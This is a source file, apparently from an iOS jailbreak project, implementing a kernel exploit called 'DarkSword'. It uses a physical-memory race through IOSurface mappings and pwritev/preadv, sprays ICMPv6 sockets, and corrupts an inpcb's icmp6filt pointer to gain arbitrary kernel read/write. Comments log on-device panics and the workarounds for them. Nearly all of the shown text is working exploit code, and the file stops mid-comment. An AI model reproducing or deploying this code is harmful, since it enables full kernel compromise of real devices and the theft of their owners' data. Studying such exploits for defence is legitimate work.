#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <mach/mach.h>
#include <mach/mach_time.h>
#include <mach-o/dyld.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <sys/fileport.h>
#include <pthread.h>
#include <sys/uio.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <spawn.h>
#include <dlfcn.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <errno.h>
#include <stdarg.h>
#include <aio.h>
#include <glob.h>
#include <IOKit/IOKitLib.h>
#import <IOSurface/IOSurfaceRef.h>
#import <ImageIO/ImageIO.h>
#import <CoreGraphics/CoreGraphics.h>
// Minimal valid JPEG (1x1 pixel, baseline, YCbCr)
static const uint8_t kTinyJPEG[] = {
    0xFF,0xD8,0xFF,0xE0,0x00,0x10,0x4A,0x46,0x49,0x46,0x00,0x01,0x01,0x00,0x00,0x01,
    0x00,0x01,0x00,0x00,0xFF,0xDB,0x00,0x43,0x00,0x08,0x06,0x06,0x07,0x06,0x05,0x08,
    0x07,0x07,0x07,0x09,0x09,0x08,0x0A,0x0C,0x14,0x0D,0x0C,0x0B,0x0B,0x0C,0x19,0x12,
    0x13,0x0F,0x14,0x1D,0x1A,0x1F,0x1E,0x1D,0x1A,0x1C,0x1C,0x20,0x24,0x2E,0x27,0x20,
    0x22,0x2C,0x23,0x1C,0x1C,0x28,0x37,0x29,0x2C,0x30,0x31,0x34,0x34,0x34,0x1F,0x27,
    0x39,0x3D,0x38,0x32,0x3C,0x2E,0x33,0x34,0x32,0xFF,0xC0,0x00,0x0B,0x08,0x00,0x01,
    0x00,0x01,0x01,0x01,0x11,0x00,0xFF,0xC4,0x00,0x1F,0x00,0x00,0x01,0x05,0x01,0x01,
    0x01,0x01,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x02,0x03,0x04,0x05,
    0x06,0x07,0x08,0x09,0x0A,0x0B,0xFF,0xC4,0x00,0xB5,0x10,0x00,0x02,0x01,0x03,0x03,
    0x02,0x04,0x03,0x05,0x05,0x04,0x04,0x00,0x00,0x01,0x7D,0x01,0x02,0x03,0x00,0x04,
    0x11,0x05,0x12,0x21,0x31,0x41,0x06,0x13,0x51,0x61,0x07,0x22,0x71,0x14,0x32,0x81,
    0x91,0xA1,0x08,0x23,0x42,0xB1,0xC1,0x15,0x52,0xD1,0xF0,0x24,0x33,0x62,0x72,0x82,
    0x09,0x0A,0x16,0x17,0x18,0x19,0x1A,0x25,0x26,0x27,0x28,0x29,0x2A,0x34,0x35,0x36,
    0x37,0x38,0x39,0x3A,0x43,0x44,0x45,0x46,0x47,0x48,0x49,0x4A,0x53,0x54,0x55,0x56,
    0x57,0x58,0x59,0x5A,0x63,0x64,0x65,0x66,0x67,0x68,0x69,0x6A,0x73,0x74,0x75,0x76,
    0x77,0x78,0x79,0x7A,0x83,0x84,0x85,0x86,0x87,0x88,0x89,0x8A,0x92,0x93,0x94,0x95,
    0x96,0x97,0x98,0x99,0x9A,0xA2,0xA3,0xA4,0xA5,0xA6,0xA7,0xA8,0xA9,0xAA,0xB2,0xB3,
    0xB4,0xB5,0xB6,0xB7,0xB8,0xB9,0xBA,0xC2,0xC3,0xC4,0xC5,0xC6,0xC7,0xC8,0xC9,0xCA,
    0xD2,0xD3,0xD4,0xD5,0xD6,0xD7,0xD8,0xD9,0xDA,0xE1,0xE2,0xE3,0xE4,0xE5,0xE6,0xE7,
    0xE8,0xE9,0xEA,0xF1,0xF2,0xF3,0xF4,0xF5,0xF6,0xF7,0xF8,0xF9,0xFA,0xFF,0xC4,0x00,
    0x1F,0x01,0x00,0x03,0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x00,0x00,0x00,
    0x00,0x00,0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0A,0x0B,0xFF,0xC4,
    0x00,0xB5,0x11,0x00,0x02,0x01,0x02,0x04,0x04,0x03,0x04,0x07,0x05,0x04,0x04,0x00,
    0x01,0x02,0x77,0x00,0x01,0x02,0x03,0x11,0x04,0x05,0x21,0x31,0x06,0x12,0x41,0x51,
    0x07,0x61,0x71,0x13,0x22,0x32,0x81,0x08,0x14,0x42,0x91,0xA1,0xB1,0xC1,0x09,0x23,
    0x33,0x52,0xF0,0x15,0x62,0x72,0xD1,0x0A,0x16,0x24,0x34,0xE1,0x25,0xF1,0x17,0x18,
    0x19,0x1A,0x26,0x27,0x28,0x29,0x2A,0x35,0x36,0x37,0x38,0x39,0x3A,0x43,0x44,0x45,
    0x46,0x47,0x48,0x49,0x4A,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5A,0x63,0x64,0x65,
    0x66,0x67,0x68,0x69,0x6A,0x73,0x74,0x75,0x76,0x77,0x78,0x79,0x7A,0x82,0x83,0x84,
    0x85,0x86,0x87,0x88,0x89,0x8A,0x92,0x93,0x94,0x95,0x96,0x97,0x98,0x99,0x9A,0xA2,
    0xA3,0xA4,0xA5,0xA6,0xA7,0xA8,0xA9,0xAA,0xB2,0xB3,0xB4,0xB5,0xB6,0xB7,0xB8,0xB9,
    0xBA,0xC2,0xC3,0xC4,0xC5,0xC6,0xC7,0xC8,0xC9,0xCA,0xD2,0xD3,0xD4,0xD5,0xD6,0xD7,
    0xD8,0xD9,0xDA,0xE2,0xE3,0xE4,0xE5,0xE6,0xE7,0xE8,0xE9,0xEA,0xF2,0xF3,0xF4,0xF5,
    0xF6,0xF7,0xF8,0xF9,0xFA,0xFF,0xDA,0x00,0x08,0x01,0x01,0x00,0x00,0x3F,0x00,0x77,
    0x3F,0xC0,0x7F,0xFF,0xD9
};

void IOSurfacePrefetchPages(IOSurfaceRef surface);

extern int proc_name(int pid, void *buffer, uint32_t buffersize);
extern int proc_pidpath(int pid, void *buffer, uint32_t buffersize);

extern kern_return_t mach_vm_allocate(task_t, mach_vm_address_t *, mach_vm_size_t, int);
extern kern_return_t mach_vm_deallocate(task_t, mach_vm_address_t, mach_vm_size_t);
extern kern_return_t mach_vm_map(task_t, mach_vm_address_t *, mach_vm_size_t,
    mach_vm_offset_t, int, mem_entry_name_port_t, memory_object_offset_t,
    boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);

#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"

#ifdef __arm64e__
static uint64_t __attribute((naked)) __xpaci(uint64_t a)
{
    asm(".long        0xDAC143E0"); // XPACI X0
    asm("ret");
}
static uint64_t xpaci(uint64_t a)
{
    // If it already looks like a plain kernel pointer, leave it alone
    if ((a & 0xFFFFFF0000000000) == 0xFFFFFF0000000000) return a;
    return __xpaci(a);
}
#else
#define __xpaci(x) x
#define xpaci(x) x
#endif

#include "offsets.h"
#include "AppDelegate.h"

// ===== Global state =====
static uint64_t randomMarker;
static uint64_t wiredPageMarker;
static mach_port_t pcObject = MACH_PORT_NULL;
static mach_vm_address_t pcAddress = 0;
static mach_vm_size_t pcSize;
static int readFd, writeFd;
static NSMutableArray *socketPorts;
static NSMutableArray *socketPcbIds;
static int controlSocket = 0, rwSocket = 0;
static uint64_t controlSocketPcb = 0, rwSocketPcb = 0;
static int socketCsi = -1;
// TRUE the instant find_and_corrupt_socket() plants control.icmp6filt ->
// rwSocketPcb+0x148. From that moment the process MUST NEVER exit: closing
// the control fd runs in6_pcbdetach -> kfree(in6p_icmp6filt), whose pointer
// now resolves into the inpcb/socket zone (not data.kalloc.32) ->
// "not in the expected zone data.kalloc.32, but found in socket[498]" panic
// (observed on-device 2026-08-01 23:13). All paths past this point either
// succeed (then keep the runloop alive forever) or spin instead of returning.
static bool gSocketsCorrupted = false;
// Every socket port whose inpcb icmp6filt has ever been corrupted. Such a
// socket can NEVER be closed/deallocated (kfree of the poisoned filter ->
// zone panic, observed twice), so all release paths skip these.
static NSMutableSet *leakedPorts;
static uint64_t gControlSocketAddr = 0, gRwSocketAddr = 0;
// Real inpcb offset of in6p_icmp6filt on THIS kernel. OFFSET_ICMP6FILT (0x148)
// was verified on-device (dump_inp_*.bin show a valid heap ptr at +0x148, and
// clearsword_utils.c uses 0x148 for iOS 18+); find_and_corrupt_socket() probes
// exactly that slot and stores it here for later kwrite/restore paths.
static uint64_t gIcmp6FiltOffset = OFFSET_ICMP6FILT;
static uint8_t controlData[0x20];
static volatile uint8_t goSync = 0, raceSync = 0, freeThreadStart = 0;
static volatile uint8_t freeThreadDone = 0;
static volatile uint8_t writeRequested = 0, writeDone = 0;
static volatile mach_vm_address_t freeTarget = 0;
static volatile mach_vm_size_t freeTargetSize = 0;
static volatile mem_entry_name_port_t targetObject = 0;
static volatile memory_object_offset_t targetObjectOffset = 0;
static pthread_t freeThread;
static pthread_t writeThread;
static int highestSuccessIdx = 0;
static int successReadCount = 0;
static uint64_t gNameHits = 0, gRejZero = 0, gRejGencnt = 0, gRejCsi = 0;
static uint64_t gInpcbMarkers = 0;
static struct iovec iov;
static char executablePath[PATH_MAX];
static const char *executableName;
static NSMutableDictionary *gMlockDict;

// Wired-mapping groom (A18-style, scaled for 4 GB RAM). The original A18 path
// pins ~3 GB of PurpleGfxMem-backed IOSurface pages to drain the physical free
// list so the tiny search mappings and the sprayed socket inpcbs land in the
// same fresh sequential region. On A14 we scale the wired region down and keep
// the search total smaller so the pair stays within the ~1 GB Jetsam budget.
#define WIRED_MAPPING_SIZE 0x20000000      // 512 MB pinned
static mach_vm_address_t wiredMapping = 0;
static mach_vm_size_t wiredMappingSize = WIRED_MAPPING_SIZE;

// Kernel state globals (used by all phases)
uint64_t gOurProc, gKernelProc, gOurTask, gKernelTask, gIS_TABLE;
uint64_t gOurPmap, gKernelPmap, gKernelBase, gKernelSlide;
uint64_t gOurUcred = 0;

// ===== Helpers =====
#define FAILURE(c) do { log_printf(@"[-] FAILURE at %s:%d\n", __FILE__, __LINE__); return; } while(0)

void c_log(const char *fmt, ...) {
    char buf[4096];
    va_list args;
    va_start(args, fmt);
    vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);
    log_printf(@"%s", buf);
}
#define printf(...) c_log(__VA_ARGS__)

void memset64(void *ptr, uint64_t val, size_t sz) {
    for (size_t i = 0; i < sz; i += 8)
        *(uint64_t*)((uint8_t*)ptr + i) = val;
}

// ===== DarkSword ICMP6 Socket Exploit =====

IOSurfaceRef create_surface_with_address(uint64_t address, uint64_t size) {
    IOSurfaceRef surface = IOSurfaceCreate((__bridge CFDictionaryRef)@{
        @"IOSurfaceAddress": @(address),
        @"IOSurfaceAllocSize": @(size)
    });
    IOSurfacePrefetchPages(surface);
    return surface;
}

// Forward decls needed by functions that call helpers defined below.
uint64_t find_proc_by_pid(uint32_t pid);
uint64_t find_our_proc(void);
uint64_t get_task_from_proc(uint64_t proc);
uint64_t get_ucred_from_proc(uint64_t proc);
bool platformize_proc(void);

void surface_mlock(uint64_t address, uint64_t size) {
    gMlockDict[@(address)] = (__bridge id)create_surface_with_address(address, size);
}

void surface_munlock(uint64_t address, uint64_t size) {
    IOSurfaceRef ref = (__bridge IOSurfaceRef)gMlockDict[@(address)];
    if (ref) {
        CFRelease(ref);
        [gMlockDict removeObjectForKey:@(address)];
    }
}

static void create_physically_contiguous_mapping(mach_port_t *port, mach_vm_address_t *address, mach_vm_size_t size) {
    NSDictionary *params = @{
        (__bridge id)kIOSurfaceAllocSize : @(size),
        @"IOSurfaceMemoryRegion" : @"PurpleGfxMem",
    };

    IOSurfaceRef surface = IOSurfaceCreate((__bridge CFDictionaryRef)params);

    if (!surface) {
        printf("[-] IOSurfaceCreate failed — falling back to pure Mach VM\n");
        kern_return_t kr = mach_vm_allocate(mach_task_self(), address, size,
            VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
        if (kr != KERN_SUCCESS) {
            printf("[-] mach_vm_allocate: %s\n", mach_error_string(kr));
            return;
        }
        memset64((void*)*address, randomMarker, size);
        kr = mach_make_memory_entry_64(mach_task_self(), &size, *address,
            VM_PROT_DEFAULT, port, 0);
        if (kr != KERN_SUCCESS) {
            printf("[-] mach_make_memory_entry_64: %s\n", mach_error_string(kr));
            mach_vm_deallocate(mach_task_self(), *address, size);
            return;
        }
        printf("[+] fallback bounce buffer: entry=%u va=0x%llx size=0x%llx\n", *port, *address, size);
        return;
    }

    void *physicalMappingAddress = IOSurfaceGetBaseAddress(surface);
    printf("[+] physicalMappingAddress: %p\n", physicalMappingAddress);

    kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &size,
        (mach_vm_address_t)physicalMappingAddress, VM_PROT_DEFAULT, port, 0);
    if (kr != KERN_SUCCESS) {
        printf("[-] mach_make_memory_entry_64: %s\n", mach_error_string(kr));
        CFRelease(surface);
        return;
    }

    kr = mach_vm_map(mach_task_self(), address, size, 0,
        VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, *port, 0, 0,
        VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    if (kr != KERN_SUCCESS) {
        printf("[-] mach_vm_map: %s\n", mach_error_string(kr));
        mach_port_deallocate(mach_task_self(), *port);
        CFRelease(surface);
        return;
    }

    CFRelease(surface);
    printf("[+] IOSurface bounce buffer: entry=%u va=0x%llx size=0x%llx\n", *port, *address, size);
}

static bool initialize_bounce_buffer(uint64_t size) {
    pcSize = size;
    create_physically_contiguous_mapping(&pcObject, &pcAddress, pcSize);
    if (!pcObject || !pcAddress) {
        printf("[-] create_physically_contiguous_mapping failed\n");
        return false;
    }
    memset64((void *)pcAddress, randomMarker, pcSize);
    freeTarget = pcAddress;
    freeTargetSize = pcSize;
    freeThreadStart = 1;
    goSync = 1;
    return true;
}

void init_target_file(void) {
    char rp[1024] = {}, wp[1024] = {};
    confstr(_CS_DARWIN_USER_TEMP_DIR, rp, 1024);
    confstr(_CS_DARWIN_USER_TEMP_DIR, wp, 1024);
    char rn[64], wn[64];
    snprintf(rn, sizeof(rn), "/%u", arc4random());
    snprintf(wn, sizeof(wn), "/%u", arc4random());
    strlcat(rp, rn, sizeof(rp));
    strlcat(wp, wn, sizeof(wp));
    void *c = calloc(1, 2 * PAGE_SIZE);
    FILE *f = fopen(rp, "w"); fwrite(c, 1, 2 * PAGE_SIZE, f); fclose(f);
    f = fopen(wp, "w"); fwrite(c, 1, 2 * PAGE_SIZE, f); fclose(f);
    free(c);
    readFd = open(rp, O_RDWR);
    writeFd = open(wp, O_RDWR);
    remove(rp); remove(wp);
    fcntl(readFd, F_NOCACHE, 1);
    fcntl(writeFd, F_NOCACHE, 1);
}

void *free_thread(void *arg) {
    (void)arg;
    while (freeThreadStart == 0) {}
    while (goSync == 0) {}
    while (goSync != 0) {
        while (raceSync == 0) {}
        mach_vm_map(mach_task_self(), (mach_vm_address_t*)&freeTarget, freeTargetSize, 0,
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, targetObject, targetObjectOffset, 0,
            VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
        raceSync = 0;
    }
    freeThreadDone = 1;
    return NULL;
}

// Simple direct check: scan freed pages for non-randomMarker data
// indicating the kernel reused them (e.g., for inpcb structures)
bool scan_freed_pages(void *buf, mach_vm_size_t size) {
    uint64_t *words = (uint64_t *)buf;
    uint64_t n = size / sizeof(uint64_t);
    for (uint64_t i = 0; i < n; i++) {
        if (words[i] != randomMarker) return true;
    }
    return false;
}

// DIAGNOSTIC: write raw OOB windows to Documents/dump_<tag>_<n>.bin so they
// can be pulled off-device via AFC and inspected offline. This tells us what
// the OOB window actually contains (kernel inpcb vs our own process pages).
static uint64_t gDumpCount = 0;
static void dump_window(const void *buf, mach_vm_size_t size, const char *tag) {
    if (gDumpCount >= 64) return;
    NSString *dir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *path = [dir stringByAppendingPathComponent:
        [NSString stringWithFormat:@"dump_%s_%llu.bin", tag, gDumpCount]];
    FILE *f = fopen(path.fileSystemRepresentation, "wb");
    if (f) { fwrite(buf, 1, size, f); fclose(f); }
    gDumpCount++;
}

// DIAGNOSTIC: decode the first words of a window as pointers/ASCII so the
// on-device log shows us what kind of memory we are reading.
static void describe_window(const void *buf, mach_vm_size_t size, const char *tag) {
    printf("[dbg] %s window @ %p size=0x%llx\n", tag, buf, (unsigned long long)size);
    const uint64_t *w = (const uint64_t *)buf;
    for (int i = 0; i < 8 && (mach_vm_size_t)(i * 8) < size; i++) {
        printf("[dbg]   +0x%03x: 0x%016llx\n", i * 8, (unsigned long long)w[i]);
    }
    fflush(stdout);
}

// DIAGNOSTIC: count occurrences of the icmp6_filter marker
// 0x0000ffffffffffff in a window. A hit strongly suggests the window
// contains a kalloc.1024 inpcb rather than fs/vnode data.
static uint64_t count_inpcb_markers(const void *buf, mach_vm_size_t size) {
    const uint8_t *p = (const uint8_t *)buf;
    const uint8_t marker[8] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00};
    uint64_t hits = 0;
    for (mach_vm_size_t i = 0; i + 8 <= size; i++) {
        if (p[i] == 0xff && p[i + 1] == 0xff && p[i + 2] == 0xff && p[i + 3] == 0xff &&
            p[i + 4] == 0xff && p[i + 5] == 0xff && p[i + 6] == 0xff && p[i + 7] == 0x00) {
            hits++;
            i += 8;
        }
    }
    return hits;
}

// darksword-kexploit: search for needle scanning BACKWARD from the end of
// haystack. Used to find the inpcb base: the icmp6filt field lives at
// inpcb + OFFSET_ICMP6FILT and the qword right after it holds the marker
// 0x0000ffffffffffff, so pcb_start_offset = marker_offset - (0x148 + 8).
static void *reverse_memmem(const void *haystack, size_t haystack_len,
                            const void *needle, size_t needle_len) {
    if (needle_len == 0) return (void *)haystack;
    if (haystack_len < needle_len) return NULL;
    const char *h = (const char *)haystack;
    const char *n = (const char *)needle;
    for (size_t i = haystack_len - needle_len + 1; i-- > 0;) {
        if (memcmp(h + i, n, needle_len) == 0) return (void *)(h + i);
    }
    return NULL;
}

// Process-name oracle markers (mirrors lara initprocmarkers). We search the
// window for any of these strings to anchor the reverse_memmem scan below.
#define MAX_PROCESS_MARKERS 8
#define PROCESS_MARKER_MAX_LEN 64
static char gProcessMarkers[MAX_PROCESS_MARKERS][PROCESS_MARKER_MAX_LEN];
static int gProcessMarkerCount = 0;

static void addprocmarker(const char *marker) {
    if (!marker || marker[0] == '\0') return;
    size_t len = strnlen(marker, PROCESS_MARKER_MAX_LEN - 1);
    if (len == 0) return;
    for (int i = 0; i < gProcessMarkerCount; i++)
        if (strncmp(gProcessMarkers[i], marker, PROCESS_MARKER_MAX_LEN) == 0) return;
    if (gProcessMarkerCount >= MAX_PROCESS_MARKERS) return;
    memset(gProcessMarkers[gProcessMarkerCount], 0, PROCESS_MARKER_MAX_LEN);
    memcpy(gProcessMarkers[gProcessMarkerCount], marker, len);
    gProcessMarkerCount++;
}

static void addprocmarker_variants(const char *marker) {
    addprocmarker(marker);
    size_t len = strnlen(marker ?: "", PROCESS_MARKER_MAX_LEN - 1);
    if (len > 15) {
        char truncated[16] = {0};
        memcpy(truncated, marker, 15);
        addprocmarker(truncated);
    }
}

static void initprocmarkers(void) {
    memset(gProcessMarkers, 0, sizeof(gProcessMarkers));
    gProcessMarkerCount = 0;
    if (executableName && executableName[0])
        addprocmarker_variants(executableName);
    char kernelProcessName[PROCESS_MARKER_MAX_LEN] = {0};
    if (proc_name(getpid(), kernelProcessName, sizeof(kernelProcessName)) > 0)
        addprocmarker_variants(kernelProcessName);
    for (int i = 0; i < gProcessMarkerCount; i++)
        printf("[+] process_marker %d: %s\n", i, gProcessMarkers[i]);
    fflush(stdout);
}

fileport_t spray_socket(void) {
    pthread_set_qos_class_self_np(QOS_CLASS_BACKGROUND, 0);
    int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
    if (fd < 0) { pthread_set_qos_class_self_np(QOS_CLASS_USER_INITIATED, 0); return -1; }
    pthread_set_qos_class_self_np(QOS_CLASS_USER_INITIATED, 0);
    fileport_t port = 0;
    fileport_makeport(fd, &port);
    close(fd);
    void *info = calloc(1, 0x400);
    syscall(336, 6, getpid(), 3, port, info, 0x400);
    uint64_t gencnt = *(uint64_t*)((uintptr_t)info + 0x110);
    [(NSMutableArray*)socketPorts addObject:@(port)];
    [(NSMutableArray*)socketPcbIds addObject:@(gencnt)];
    free(info);
    return port;
}

void sockets_release(void) {
    while ([(NSMutableArray*)socketPorts lastObject]) {
        NSNumber *p = [(NSMutableArray*)socketPorts lastObject];
        if (leakedPorts && [(NSMutableSet*)leakedPorts containsObject:p]) {
            [(NSMutableArray*)socketPorts removeLastObject];
            [(NSMutableArray*)socketPcbIds removeLastObject];
            continue;
        }
        mach_port_deallocate(mach_task_self(), [p unsignedIntValue]);
        [(NSMutableArray*)socketPorts removeLastObject];
        [(NSMutableArray*)socketPcbIds removeLastObject];
    }
}

// Release every sprayed socket EXCEPT the corrupted control/rw pair at
// (socketCsi, socketCsi+1). Closing a corrupted socket kfree()s its poisoned
// inp_icmp6filt (control's points into the rw inpcb kalloc.1024 element, rw's
// points at whatever set_kaddr last wrote), which is not a kalloc.32 allocation
// -> "data.kalloc.32 not in expected zone" panic (observed on-device). Those
// two sockets are leaked forever instead (ClearSword krw_sockets_leak_forever:
// so_count is raised on the accepted path so even process exit cannot close
// them).
void sockets_release_except_pair(void) {
    if (socketCsi < 0) { sockets_release(); return; }
    for (NSUInteger i = 0; i < [(NSMutableArray*)socketPorts count]; i++) {
        NSNumber *p = (NSNumber*)[(NSMutableArray*)socketPorts objectAtIndex:i];
        if (i == (NSUInteger)socketCsi || i == (NSUInteger)(socketCsi + 1))
            continue;
        if (leakedPorts && [(NSMutableSet*)leakedPorts containsObject:p])
            continue;
        mach_port_deallocate(mach_task_self(), [p unsignedIntValue]);
    }
    socketCsi = -1;
}

kern_return_t phys_oob_read(mach_port_t memObj, mach_vm_offset_t memOff,
                             mach_vm_size_t size, mach_vm_offset_t off, void *buf) {
    targetObject = memObj;
    targetObjectOffset = memOff;
    iov.iov_base = (void*)(pcAddress + 0x3f00);
    iov.iov_len = off + size;
    *(uint64_t*)buf = randomMarker;
    *(uint64_t*)(pcAddress + 0x3f00 + off) = randomMarker;

    bool readRaceSucceeded = false;
    for (int t = 0; t < highestSuccessIdx + 100; t++) {
        raceSync = 1;
        int w = pwritev(readFd, &iov, 1, 0x3f00);
        while (raceSync == 1) {}
        mach_vm_map(mach_task_self(), &pcAddress, pcSize, 0,
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObject, 0, 0,
            VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
        if (w == -1) {
            pread(readFd, buf, size, 0x3f00 + off);
            uint64_t marker = *(uint64_t*)buf;
            if (marker != randomMarker) {
                readRaceSucceeded = true;
                successReadCount++;
                if (t > highestSuccessIdx) highestSuccessIdx = t;
                break;
            } else {
                usleep(1);
            }
        }
        if (t == 500) break;
    }
    targetObject = 0;
    if (!readRaceSucceeded) return 1;
    return KERN_SUCCESS;
}

kern_return_t phys_oob_read_retry(mach_port_t memObj, mach_vm_offset_t memOff,
                                    mach_vm_size_t size, mach_vm_offset_t off, void *buf) {
    kern_return_t kr;
    do { kr = phys_oob_read(memObj, memOff, size, off, buf); } while (kr != KERN_SUCCESS);
    return kr;
}

void phys_oob_write(mach_port_t memObj, mach_vm_offset_t memOff,
                     mach_vm_size_t size, mach_vm_offset_t off, void *buf) {
    targetObject = memObj;
    targetObjectOffset = memOff;
    iov.iov_base = (void*)(pcAddress + 0x3f00);
    iov.iov_len = off + size;
    pwrite(writeFd, buf, size, 0x3f00 + off);
    for (int t = 0; t < 20; t++) {
        raceSync = 1;
        preadv(writeFd, &iov, 1, 0x3f00);
        while (raceSync == 1) {}
        mach_vm_map(mach_task_self(), &pcAddress, pcSize, 0,
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObject, 0, 0,
            VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    }
    targetObject = 0;
}

void set_kaddr(uint64_t where) {
    memset(controlData, 0, 0x20);
    *(uint64_t*)controlData = where;
    setsockopt(controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, controlData, 0x20);
}

void early_kread(uint64_t where, void *buf, size_t size) {
    set_kaddr(where);
    socklen_t len = (socklen_t)size;
    getsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buf, &len);
}

uint64_t kread64(uint64_t where) {
    uint64_t v = 0; early_kread(where, &v, 8); return v;
}

uint32_t kread32(uint64_t where) {
    uint32_t v = 0; early_kread(where, &v, 4); return v;
}

uint16_t kread16(uint64_t where) {
    uint16_t v = 0; early_kread(where, &v, 2); return v;
}

uint8_t kread8(uint64_t where) {
    uint8_t v = 0; early_kread(where, &v, 1); return v;
}

uint64_t kread_ptr(uint64_t where) { return xpaci(kread64(where)); }

void kread_buf(uint64_t where, void *buf, size_t size) {
    uint8_t *b = (uint8_t*)buf;
    while (size >= 8) {
        *(uint64_t*)b = kread64(where);
        where += 8; b += 8; size -= 8;
    }
    if (size) early_kread(where, b, size);
}

// Our write primitive is a 32-byte setsockopt(ICMP6_FILTER) copy at an arbitrary
// address. Writing at an offset near the end of a small zone element (e.g. the
// 32-byte MAC Labels element that holds cr_label) overflows it -> "zone bound
// checks: buffer of length 32 overflows object of size 32" @zalloc.c:1297
// (observed repeatedly on iOS 18.2.1). Every kwrite therefore aligns the target
// down to a 32-byte window and does a read-modify-write, so the 32-byte copy
// starts exactly at the element boundary and can never overflow it.
static void kwrite_aligned(uint64_t where, const void *data, size_t size) {
    // Read-write window must cover the FULL [where, where+size) range, which
    // may cross a 32-byte boundary. The previous code used a single 0x20
    // stack buffer aligned to &~0x1F: when (where & 0x1F) > 0x18, an 8-byte
    // kwrite64 spilled past buf[0x20] -> stack smashing -> __stack_chk_fail
    // (SIGABRT in patch_sandbox_ext, observed twice). Use a 0x40 window that
    // spans at most two adjacent 32-byte filter slots; the ICMP6_FILTER write
    // is 0x20 bytes at an arbitrary address, so do two aligned RMW passes.
    if (size == 0) return;
    while (size > 0) {
        uint64_t base = where & ~0x1FULL;
        size_t   off  = (size_t)(where - base);
        size_t   n    = 0x20 - off;
        if (n > size) n = size;
        uint8_t buf[0x20];
        early_kread(base, buf, 0x20);
        memcpy(buf + off, data, n);
        set_kaddr(base);
        setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buf, 0x20);
        where += n;
        data   = (const uint8_t *)data + n;
        size  -= n;
    }
}

void kwrite64(uint64_t where, uint64_t val) {
    kwrite_aligned(where, &val, 8);
}

void kwrite32(uint64_t where, uint32_t val) {
    kwrite_aligned(where, &val, 4);
}

void kwrite16(uint64_t where, uint16_t val) {
    kwrite_aligned(where, &val, 2);
}

void kwrite8(uint64_t where, uint8_t val) {
    kwrite_aligned(where, &val, 1);
}

void kwrite_buf(uint64_t where, void *buf, size_t size) {
    uint8_t *b = (uint8_t*)buf;
    while (size >= 8) {
        kwrite64(where, *(uint64_t*)b);
        where += 8; b += 8; size -= 8;
    }
    if (size) {
        kwrite_aligned(where, b, size);
    }
}

// Raise so_usecount on both corrupted sockets the moment the primitive is
// proven. The kernel paniced at 23:13: xnu soclose() runs
//   so->so_proto->pr_detach = in6_pcbdetach() -> FREE(in6p_icmp6filt)   (0x20)
// UNCONDITIONALLY, before sourceling so_usecount -- so ANY path that closes
// control/rw (sockets_release on retry, fd teardown at exit) kfrees a pointer
// into the inpcb/socket zone -> "not in expected zone data.kalloc.32" panic.
// so_usecount is per-socket refcount; soclose()sorele() also free the socket
// object itself when it reaches zero. We CANNOT stop the filter kfree via
// usecount, so the only safe invariant is: after corruption these fds are
// never ever closed and the process never exits. This bump is belt-and-braces
// for the socket object itself (prevents zone recycling of the dead socket
// across retries), matching lara's krw_sockets_leak_forever().
static void leak_corrupted_sockets(void) {
    if (!controlSocketPcb || !rwSocketPcb || !gSocketsCorrupted) return;
    uint64_t csa = kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
    uint64_t rsa = kread64(rwSocketPcb + OFFSET_PCB_SOCKET);
    if ((csa >> 40) != 0xFFFFFF || (rsa >> 40) != 0xFFFFFF) return;
    uint64_t c = kread64(csa + OFFSET_SOCKET_SO_COUNT);
    uint64_t r = kread64(rsa + OFFSET_SOCKET_SO_COUNT);
    if (c > 0x10000 || r > 0x10000) return;
    gControlSocketAddr = csa;
    gRwSocketAddr = rsa;
    kwrite64(csa + OFFSET_SOCKET_SO_COUNT, c + 0x0000100100001001ULL);
    kwrite64(rsa + OFFSET_SOCKET_SO_COUNT, r + 0x0000100100001001ULL);
    // Zero rw's filter-list back link so the corrupted filter never links the
    // two inpcb filter chains.
    kwrite64(rwSocketPcb + gIcmp6FiltOffset + 8, 0);
    printf("[+] so_usecount raised immediately after corruption (csa=0x%llx rsa=0x%llx)\n", csa, rsa);
}

int find_and_corrupt_socket(mach_port_t memObj, mach_vm_offset_t seekOff,
                             void *rBuf, void *wBuf, NSMutableArray *usedGc, bool doRead) {
    if (doRead) phys_oob_read_retry(memObj, seekOff, OOB_SIZE, OOB_OFFSET, rBuf);

    // ==== darksword-kexploit inpcb oracle (lara, PROVEN on this device) ====
    // The inpcb's in6p_icmp6filt field is at inpcb + 0x148, and the qword at
    // inpcb + 0x148 + 8 holds the fixed marker 0x0000ffffffffffff. We find any
    // process-name marker (executable name / proc_name) in the window, then
    // reverse_memmem BACKWARD from it for that marker value. The marker's exact
    // position gives the inpcb base offset directly:
    //     pcb_start_offset = marker_offset - (icmp6filt_offset + 8)
    // This is EXACT (no 0x400-alignment guess). The old code aligned the name
